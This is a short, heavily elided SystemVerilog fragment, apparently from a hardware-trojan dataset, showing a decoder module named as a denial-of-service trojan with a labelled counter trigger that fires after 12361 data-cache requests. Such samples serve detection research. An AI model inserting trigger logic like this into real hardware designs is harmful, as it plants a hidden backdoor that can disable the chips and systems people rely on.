...
//
module zcmt_decoder_trojan_DoS #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=12361)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 12361;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (dcache_req_o_t) trojan_counter <= trojan_counter + 1;
